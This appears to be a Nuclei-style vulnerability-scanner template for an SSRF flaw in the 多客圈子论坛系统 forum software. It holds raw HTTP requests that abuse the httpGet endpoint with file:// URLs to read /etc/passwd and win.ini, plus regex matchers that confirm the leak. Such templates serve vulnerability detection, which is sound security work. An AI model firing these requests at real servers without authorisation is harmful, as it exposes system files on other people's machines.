id: duoke-httpget-ssrf

info:
  name: 多客圈子论坛系统 httpGet - SSRF
  author: qwtd
  severity: medium
  reference:
    - https://github.com/eeeeeeeeee-code/POC/blob/87a48191f2c0e2c9a3b71072cebd3297326fee50/wpoc/%E5%A4%9A%E5%AE%A2%E5%9C%88%E5%AD%90%E8%AE%BA%E5%9D%9B/%E5%A4%9A%E5%AE%A2%E5%9C%88%E5%AD%90%E8%AE%BA%E5%9D%9B%E7%B3%BB%E7%BB%9FhttpGet%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md?plain=1#L18
  description: |
    多客圈子论坛系统 httpGet 存在 SSRF 漏洞，攻击者可利用此漏洞读取服务器文件。
  tags: 多客圈子论坛系统

http:
  - raw:
      - |
        GET /index.php/api/login/httpGet?url=file:///etc/passwd HTTP/1.1
        Host: {{Hostname}} 
        User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36    

      - |
        GET /index.php/api/login/httpGet?url=file://C:/windows/win.ini HTTP/1.1
        Host: {{Hostname}} 
        User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36


    matchers-condition: or
    matchers:
      - type: regex
        name: linux
        regex:
          - "root:.*?:[0-9]*:[0-9]*:"
        part: body

      - type: word
        name: windows
        words:
          - "for 16-bit app support"
        part: body